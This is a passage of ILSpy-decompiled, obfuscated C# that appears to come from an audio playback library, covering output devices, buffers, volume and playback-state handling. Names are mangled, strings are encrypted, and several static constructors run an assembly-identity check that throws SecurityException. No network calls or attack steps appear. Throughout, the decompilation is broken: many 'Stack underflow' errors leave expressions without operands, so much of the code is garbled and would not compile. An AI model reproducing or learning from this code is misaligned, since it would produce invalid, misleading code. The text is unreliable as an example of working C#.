			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 2
			object obj = ((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				this._0001 = global::_001C._0005._0003;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public void _0001(global::_001C._0004 _0002)
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			((global::_000E._0008)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_001C._0004)/*Error near IL_0009: Stack underflow*/;
			global::_0005._0005 obj = _0002.WaveFormat;
			((global::_000E._0008)/*Error near IL_0016: Stack underflow*/)._0001 = obj;
		}

		public void _0005()
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			((global::_000E._0008)/*Error near IL_0019: Stack underflow*/)._0002();
			_ = _0091_0002._009B_0005;
			/*Error near IL_0010: Stack underflow*/((object)/*Error near IL_0010: Stack underflow*/);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0005();
		}

		private void _0006()
		{
			//IL_01c9: Incompatible stack heights: 0 vs 1
			bool flag = false;
			bool flag2 = false;
			((global::_000E._0008)/*Error near IL_0018: Stack underflow*/)._0001 = 0L;
			Exception ex = null;
			try
			{
				global::_0011._0018._0001(this);
				int num = 1;
				if (PlaybackState == global::_001C._0005._0001)
				{
					this._0002._0001(0u);
					this._0003 = 0;
					num = global::_0011._0018._0001(this._0001, this);
				}
				if (num <= 0)
				{
					return;
				}
				object obj = this._0001;
				_0091_0002._009C_0005(obj);
				try
				{
					this._0001 = global::_001C._0005._0002;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				this._0002._0001(0u, 0u, global::_000E._0008._0004._0001);
				WaitHandle[] array = new WaitHandle[3] { this._0001, this._0002, this._0003 };
				bool flag3 = true;
				while (PlaybackState != global::_001C._0005._0001 && flag3)
				{
					int num2 = _0004_0003._0080_0006(array, 3 * this._0004, false);
					if (num2 != 258)
					{
						switch (num2)
						{
						case 2:
							global::_0011._0018._0001(this);
							flag = true;
							flag3 = false;
							continue;
						case 0:
							if (flag2)
							{
								this._0001 += this._0002 * 2;
							}
							break;
						default:
							flag2 = true;
							break;
						}
						num2 = ((num2 == 0) ? 1 : 0);
						this._0003 = num2 * this._0002;
						if (global::_0011._0018._0001(this._0002, this) == 0)
						{
							global::_0011._0018._0001(this);
							flag = true;
							flag3 = false;
						}
						continue;
					}
					global::_0011._0018._0001(this);
					flag = true;
					flag3 = false;
					throw new Exception(_0080._0014._0001(107388597));
				}
			}
			catch (Exception ex2)
			{
				ex = ex2;
			}
			finally
			{
				if (!flag)
				{
					try
					{
						global::_0011._0018._0001(this);
					}
					catch (Exception ex3)
					{
						if (ex == null)
						{
							ex = ex3;
						}
					}
				}
				object obj = this._0001;
				_0091_0002._009C_0005(obj);
				try
				{
					this._0001 = global::_001C._0005._0001;
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				this._0001 = 0L;
				global::_0011._0018._0001(ex, this);
			}
		}

		static _0008()
		{
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005b: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107388560);
			new Guid((string)/*Error near IL_0054: Stack underflow*/);
			global::_000E._0008._0002 = (Guid)/*Error near IL_000e: Stack underflow*/;
			_0080._0014._0001(107388511);
			global::_000E._0008._0003 = new Guid((string)/*Error near IL_001a: Stack underflow*/);
			global::_000E._0008._0004 = new Guid(_0080._0014._0001(107388430));
			global::_000E._0008._0005 = new Guid(_0080._0014._0001(107388925));
		}
	}
}
namespace _001A
{
	internal sealed class _0004
	{
		[CompilerGenerated]
		private Guid _0001;

		[CompilerGenerated]
		private string _0001;

		[CompilerGenerated]
		private string _0002;

		public Guid Guid
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0001 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string Description
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0001 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public string ModuleName
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/)._0002 = (string)/*Error near IL_0009: Stack underflow*/;
			}
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal interface _0007
	{
		global::_0005._0005 WaveFormat { get; }

		int _0001(float[] _0002, int _0003, int _0004);
	}
}
namespace _001C
{
	internal enum _0005
	{
		_0001,
		_0002,
		_0003
	}
}
namespace _0016
{
	internal sealed class _0007 : IDisposable, global::_0010._0006, _001F._0006
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0007 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		private global::_0007._0014 m__0001;

		private readonly global::_0010._0019 m__0001;

		private readonly global::_0003._000F m__0001;

		internal global::_0005._0014 _0001;

		private global::_001C._0004 m__0001;

		private int m__0001;

		private int m__0002;

		internal int _0003;

		private readonly bool m__0001;

		private EventWaitHandle m__0001;

		internal byte[] _0001;

		internal volatile global::_001C._0005 _0001;

		private Thread m__0001;

		private global::_0005._0005 m__0001;

		private bool m__0002;

		internal readonly SynchronizationContext _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		public global::_0005._0005 OutputWaveFormat => ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001;

		public global::_001C._0005 PlaybackState => ((_0007)/*Error near IL_0009: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_001b: Incompatible stack heights: 0 vs 1
				_ = ((_0007)/*Error near IL_0007: Stack underflow*/).m__0001.AudioEndpointVolume;
				_ = ((_0080._0011)/*Error near IL_001b: Stack underflow*/).MasterVolumeLevelScalar;
				return (float)/*Error near IL_000c: Stack underflow*/;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0052: Incompatible stack heights: 0 vs 1
				//IL_0059: Incompatible stack heights: 0 vs 1
				//IL_0060: Incompatible stack heights: 0 vs 1
				if (!((float)/*Error near IL_0009: Stack underflow*/ >= 0f))
				{
					_0080._0014._0001(107388827);
					_0080._0014._0001(107388818);
					throw new ArgumentOutOfRangeException((string?)/*Error near IL_001c: Stack underflow*/, (string?)/*Error near IL_001c: Stack underflow*/);
				}
				if (value > 1f)
				{
					throw new ArgumentOutOfRangeException(_0080._0014._0001(107388827), _0080._0014._0001(107388818));
				}
				this.m__0001.AudioEndpointVolume.MasterVolumeLevelScalar = value;
			}
		}

		public global::_000E._001A AudioStreamVolume
		{
			get
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0028: Incompatible stack heights: 0 vs 1
				//IL_002f: Incompatible stack heights: 0 vs 1
				if (((_0007)/*Error near IL_0007: Stack underflow*/).m__0001 == global::_0003._000F._0002)
				{
					_0080._0014._0001(107388737);
					new InvalidOperationException((string?)/*Error near IL_002f: Stack underflow*/);
					throw /*Error near IL_0014: Stack underflow*/;
				}
				return this.m__0001.AudioStreamVolume;
			}
		}

		public event EventHandler<global::_0003._0003> PlaybackStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0007)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0007()
			: this(global::_0011._0018._0001(), global::_0003._000F._0001, _009D_008F_0006: true, 200)
		{
		}

		public _0007(global::_0003._000F _009C_008F_0006, int _009B_008F_0006)
			: this(global::_0011._0018._0001(), _009C_008F_0006, _009D_008F_0006: true, _009B_008F_0006)
		{
		}

		public _0007(global::_0003._000F _009C_008F_0006, bool _009D_008F_0006, int _009B_008F_0006)
			: this(global::_0011._0018._0001(), _009C_008F_0006, _009D_008F_0006, _009B_008F_0006)
		{
		}

		public _0007(global::_0010._0019 _009A_008F_0006, global::_0003._000F _009C_008F_0006, bool _009D_008F_0006, int _009B_008F_0006)
		{
			this.m__0001 = _009A_008F_0006.AudioClient;
			this.m__0001 = _009A_008F_0006;
			this.m__0001 = _009C_008F_0006;
			this.m__0001 = _009D_008F_0006;
			this.m__0001 = _009B_008F_0006;
			this._0001 = SynchronizationContext.Current;
			this.m__0001 = this.m__0001.MixFormat;
		}

		private void _0004()
		{
			//IL_019e: Incompatible stack heights: 0 vs 1
			global::_0005._0008 obj = default(global::_0005._0008);
			if (0 == 0)
			{
				obj = null;
			}
			global::_001C._0004 obj2 = ((_0007)/*Error near IL_0012: Stack underflow*/).m__0001;
			Exception ex = null;
			try
			{
				if (this.m__0002)
				{
					obj = new global::_0005._0008(this.m__0001, this.m__0001);
					obj2 = obj;
				}
				this.m__0002 = this.m__0001.BufferSize;
				this._0003 = this.m__0001._0001 * this.m__0001._0003 / 8;
				this._0001 = new byte[this.m__0002 * this._0003];
				global::_0011._0018._0001(obj2, this.m__0002, this);
				WaitHandle[] array = new WaitHandle[1] { this.m__0001 };
				global::_0011._0018._0001(this.m__0001);
				while (this._0001 != 0)
				{
					int num = 0;
					if (this.m__0001)
					{
						num = _0004_0003._0080_0006(array, 3 * this.m__0001, false);
					}
					else
					{
						global::_0007._0096(this.m__0001 / 2);
					}
					if (this._0001 == global::_001C._0005._0002 && num != 258)
					{
						int num2 = ((!this.m__0001) ? this.m__0001.CurrentPadding : ((this.m__0001 == global::_0003._000F._0001) ? this.m__0001.CurrentPadding : 0));
						int num3 = this.m__0002 - num2;
						if (num3 > 10)
						{
							global::_0011._0018._0001(obj2, num3, this);
						}
					}
				}
				global::_0007._0096(this.m__0001 / 2);
				global::_0011._0018._0001(this.m__0001);
				if (this._0001 == global::_001C._0005._0001)
				{
					global::_0011._0018._0001(this.m__0001);
				}
			}
			catch (Exception ex2)
			{
				ex = ex2;
			}
			finally
			{
				if (obj != null)
				{
					global::_0008._007E_0004_0002(obj);
				}
				global::_0011._0018._0001(this, ex);
			}
		}

		public long _0001()
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0028: Incompatible stack heights: 0 vs 1
			if (((_0007)/*Error near IL_0009: Stack underflow*/)._0001 == global::_001C._0005._0001)
			{
				return 0L;
			}
			_ = ((_0007)/*Error near IL_0015: Stack underflow*/).m__0001.AudioClockClient;
			return (long)((global::_001E._0011)/*Error near IL_001c: Stack underflow*/).AdjustedPosition;
		}

		public void _0001()
		{
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			if (((_0007)/*Error near IL_0009: Stack underflow*/)._0001 != global::_001C._0005._0002)
			{
				if (((_0007)/*Error near IL_0015: Stack underflow*/)._0001 == global::_001C._0005._0001)
				{
					Thread thread = new Thread(_0004);
					((_0007)/*Error near IL_002f: Stack underflow*/).m__0001 = thread;
					this._0001 = global::_001C._0005._0002;
					global::_0008._007E_0002_0002(this.m__0001);
				}
				else
				{
					this._0001 = global::_001C._0005._0002;
				}
			}
		}

		public void _0002()
		{
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 2
			if (((_0007)/*Error near IL_0009: Stack underflow*/)._0001 != 0)
			{
				((_0007)/*Error near IL_0015: Stack underflow*/)._0001 = global::_001C._0005._0001;
				_ = global::_0008._007E_0005_0002;
				Thread thread = ((_0007)/*Error near IL_0021: Stack underflow*/).m__0001;
				/*Error near IL_0026: Stack underflow*/(thread);
				this.m__0001 = null;
			}
		}

		public void _0003()
		{
			//IL_0018: Incompatible stack heights: 0 vs 1
			//IL_001b: Incompatible stack heights: 0 vs 1
			if (((_0007)/*Error near IL_0009: Stack underflow*/)._0001 == global::_001C._0005._0002)
			{
				((_0007)/*Error near IL_0016: Stack underflow*/)._0001 = global::_001C._0005._0003;
			}
		}

		public void _0001(global::_001C._0004 _0002)
		{
			//IL_0294: Incompatible stack heights: 0 vs 1
			//IL_02a0: Incompatible stack heights: 0 vs 1
			long num = ((_0007)/*Error near IL_000a: Stack underflow*/).m__0001 * 10000;
			global::_0005._0005 obj = _0002.WaveFormat;
			((_0007)/*Error near IL_0026: Stack underflow*/).m__0001 = obj;
			global::_0007._0014 obj2 = this.m__0001;
			global::_0003._000F obj3 = this.m__0001;
			global::_0005._0005 obj4 = this.m__0001;
			global::_0002._0005 obj5 = default(global::_0002._0005);
			if (!global::_0011._0018._0001(obj3, obj2, obj4, ref obj5))
			{
				if (obj5 == null)
				{
					global::_0005._0005 obj6 = this.m__0001.MixFormat;
					global::_0007._0014 obj7 = this.m__0001;
					global::_0003._000F obj8 = this.m__0001;
					if (!global::_0011._0018._0001(obj6, obj8, obj7))
					{
						global::_0002._0005[] array = new global::_0002._0005[3]
						{
							new global::_0002._0005(this.m__0001._0001, 32, this.m__0001._0001),
							new global::_0002._0005(this.m__0001._0001, 24, this.m__0001._0001),
							new global::_0002._0005(this.m__0001._0001, 16, this.m__0001._0001)
						};
						for (int i = 0; i < array.Length; i++)
						{
							obj6 = array[i];
							obj7 = this.m__0001;
							obj8 = this.m__0001;
							if (global::_0011._0018._0001(obj6, obj8, obj7))
							{
								break;
							}
							obj6 = null;
						}
						if (obj6 == null)
						{
							obj6 = new global::_0002._0005(this.m__0001._0001, 16, 2);
							obj7 = this.m__0001;
							obj8 = this.m__0001;
							if (!global::_0011._0018._0001(obj6, obj8, obj7))
							{
								throw new NotSupportedException(_0080._0014._0001(107388844));
							}
						}
					}
					this.m__0001 = obj6;
				}
				else
				{
					this.m__0001 = obj5;
				}
				global::_0005._0008 obj9 = new global::_0005._0008(_0002, this.m__0001);
				try
				{
				}
				finally
				{
					if (obj9 != null)
					{
						global::_0008._007E_0098(obj9);
					}
				}
				this.m__0002 = true;
			}
			else
			{
				this.m__0002 = false;
			}
			this.m__0001 = _0002;
			if (this.m__0001)
			{
				if (this.m__0001 == global::_0003._000F._0001)
				{
					global::_0011._0018._0001(this.m__0001, this.m__0001, global::_0005._0012._0004, num, 0L, this.m__0001, Guid.Empty);
					long num2 = this.m__0001.StreamLatency;
					if (num2 != 0L)
					{
						this.m__0001 = (int)(num2 / 10000);
					}
				}
				else
				{
					global::_0011._0018._0001(this.m__0001, this.m__0001, global::_0005._0012._0004, num, num, this.m__0001, Guid.Empty);
				}
				this.m__0001 = new EventWaitHandle(initialState: false, EventResetMode.AutoReset);
				global::_0007._0014 obj10 = this.m__0001;
				IntPtr intPtr = _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(this.m__0001));
				global::_0011._0018._0001(intPtr, obj10);
			}
			else
			{
				global::_0011._0018._0001(this.m__0001, this.m__0001, global::_0005._0012._0001, num, 0L, this.m__0001, Guid.Empty);
			}
			this._0001 = this.m__0001.AudioRenderClient;
		}

		public void _0005()
		{
			//IL_0028: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			if (((_0007)/*Error near IL_0007: Stack underflow*/).m__0001 != null)
			{
				((_0007)/*Error near IL_0032: Stack underflow*/)._0002();
				this.m__0001._0001();
				this.m__0001 = null;
				this._0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0005();
		}
	}
}
namespace _0080
{
	[StructLayout(LayoutKind.Explicit, Pack = 2)]
	internal sealed class _0004 : global::_0016._0006
	{
		[FieldOffset(0)]
		public int _0001;

		[FieldOffset(8)]
		internal byte[] _0001;

		[FieldOffset(8)]
		internal float[] _0001;

		[FieldOffset(8)]
		internal short[] _0001;

		[FieldOffset(8)]
		internal int[] _0001;

		public byte[] ByteBuffer => ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;

		public float[] FloatBuffer => ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;

		public short[] ShortBuffer => ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;

		public int[] IntBuffer => ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;

		public int MaxSize => ((_0004)/*Error near IL_0007: Stack underflow*/)._0001.Length;

		public int ByteBufferCount
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				_ = 1;
				string text = _0014._0001(107388140);
				int num = global::_0011._0018._0001((int)/*Error near IL_0016: Stack underflow*/, (_0004)/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, text);
				((_0004)/*Error near IL_001b: Stack underflow*/)._0001 = num;
			}
		}

		public int FloatBufferCount
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001 / 4;
			}
			set
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				_ = 4;
				string text = _0014._0001(107388151);
				int num = global::_0011._0018._0001((int)/*Error near IL_0016: Stack underflow*/, (_0004)/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, text);
				((_0004)/*Error near IL_001b: Stack underflow*/)._0001 = num;
			}
		}

		public int ShortBufferCount
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001 / 2;
			}
			set
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				_ = 2;
				string text = _0014._0001(107388126);
				int num = global::_0011._0018._0001((int)/*Error near IL_0016: Stack underflow*/, (_0004)/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, text);
				((_0004)/*Error near IL_001b: Stack underflow*/)._0001 = num;
			}
		}

		public int IntBufferCount
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/)._0001 / 4;
			}
			set
			{
				//IL_001d: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 2
				//IL_0023: Incompatible stack heights: 0 vs 1
				_ = 4;
				string text = _0014._0001(107388069);
				int num = global::_0011._0018._0001((int)/*Error near IL_0016: Stack underflow*/, (_0004)/*Error near IL_0016: Stack underflow*/, (int)/*Error near IL_0016: Stack underflow*/, text);
				((_0004)/*Error near IL_001b: Stack underflow*/)._0001 = num;
			}
		}

		public _0004(int _009E_008F_0006)
		{
			int num = _009E_008F_0006 % 4;
			_009E_008F_0006 = ((num == 0) ? _009E_008F_0006 : (_009E_008F_0006 + 4 - num));
			this._0001 = new byte[_009E_008F_0006];
			this._0001 = 0;
		}

		public _0004(byte[] _009F_008F_0006)
		{
			global::_0011._0018._0001(this, _009F_008F_0006);
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0014._0001(107396751), _0014._0001(107396746)), _0014._0001(107396741), _0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0014._0001(107396706));
		}
	}
}
namespace _000E
{
	internal sealed class _000E
	{
		[CompilerGenerated]
		private global::_001B._0007 _0001;

		[CompilerGenerated]
		private IntPtr _0001;

		internal global::_007F._0007 _0001;

		internal global::_001D._0003 _0001;

		public global::_001B._0007 Strategy
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			private set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (global::_001B._0007)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public IntPtr Handle
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_000E)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			internal set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_000E)/*Error near IL_0009: Stack underflow*/)._0001 = (IntPtr)/*Error near IL_0009: Stack underflow*/;
			}
		}

		internal _000E(global::_001B._0007 _0001_0090_0006, IntPtr _0083_000F)
		{
			Strategy = _0001_0090_0006;
			Handle = _0083_000F;
		}
	}
}
namespace _001B
{
	internal enum _0007
	{
		_0001,
		_0002,
		_0003,
		_0004
	}
}
namespace _001D
{
	internal sealed class _0004 : IDisposable, global::_0010._0006, _001F._0006
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0004 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		internal IntPtr _0001;

		internal global::_0007._0007[] _0001;

		private _001C._0004 m__0001;

		internal volatile _001C._0005 _0001;

		private global::_0017._0008._0003 m__0001;

		private float m__0001 = 1f;

		private global::_000E._000E m__0001;

		internal object _0001;

		internal int _0001;

		internal SynchronizationContext _0001;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int m__0003;

		[CompilerGenerated]
		private int m__0004;

		public static int DeviceCount
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				global::_0011._0018._0001();
				return (int)/*Error near IL_0003: Stack underflow*/;
			}
		}

		public int DesiredLatency
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NumberOfBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int DeviceNumber
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0004)/*Error near IL_0009: Stack underflow*/).m__0004 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 OutputWaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public _001C._0005 PlaybackState => ((_0004)/*Error near IL_0009: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0004)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0024: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				IntPtr intPtr = ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
				IntPtr intPtr2 = default(IntPtr);
				if (0 == 0)
				{
					intPtr2 = intPtr;
				}
				object obj = ((_0004)/*Error near IL_0012: Stack underflow*/)._0001;
				global::_0011._0018._0001(obj, value, intPtr2);
				this.m__0001 = value;
			}
		}

		public event EventHandler<global::_0003._0003> PlaybackStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0004)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0004()
